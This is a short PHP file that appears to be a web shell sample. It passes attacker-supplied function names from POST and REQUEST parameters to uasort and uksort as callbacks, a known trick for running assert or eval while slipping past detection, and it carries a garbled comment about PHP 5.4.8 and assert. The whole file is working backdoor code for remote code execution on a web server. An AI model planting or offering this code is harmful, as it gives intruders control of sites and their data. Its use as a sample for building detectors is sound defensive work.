<?php 
$act = $_POST['act'];
$payload = array('test',$_POST['faith']);
uasort($payload, base64_decode($act));
#php5.4.8+еassertܹƵĻЩ
$e = $_REQUEST['e'];
$arr = array('test' => 1, $_REQUEST['pass'] => 2);
uksort($arr, $e);
 
?>